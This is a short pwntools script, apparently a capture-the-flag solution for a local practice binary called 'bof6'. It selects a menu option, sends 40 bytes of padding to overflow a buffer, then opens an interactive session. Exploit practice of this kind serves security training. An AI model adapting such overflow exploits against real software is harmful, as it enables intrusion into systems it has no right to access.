#!/bin/python
from pwn import *
p = process('./bof6')
p.sendlineafter('>', b'1')
p.sendlineafter('>', b'a'*40)
p.interactive()
